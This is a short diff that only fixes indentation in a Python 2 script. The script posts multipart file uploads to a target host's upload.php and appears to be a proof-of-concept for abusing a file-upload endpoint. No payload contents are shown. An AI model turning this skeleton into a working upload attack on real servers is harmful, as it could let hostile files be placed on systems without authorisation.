@@ -7,7 +7,7 @@ def file_upload_1(ip):
 	r = requests.post(url, files=files)
 
  def file_upload_2(ip):
-    url = "http://%s/upload.php" % ip
+	url = "http://%s/upload.php" % ip
 	payload = ""
 	headers = {
 		"Content-Type": "multipart/form-data; boundary=---------------------------901447665443197094871273561",
@@ -18,7 +18,7 @@ def file_upload_1(ip):
 	d += payload
 	d += "\r\n" 
 	d += "-----------------------------901447665443197094871273561--\r\n"   
-    r = requests.post(url, headers=headers, data=d)
+    	r = requests.post(url, headers=headers, data=d)
 
 def main():
 	if len(sys.argv) != 2:
@@ -26,8 +26,8 @@ def main():
 		print "(+) eg: %s target" % sys.argv[0]
 		sys.exit(1)
 	t = sys.argv[1]
-    file_upload_1(t)
-    #file_upload_2(t)
+    	file_upload_1(t)
+    	#file_upload_2(t)
 
 if __name__ == '__main__':
 	main()	
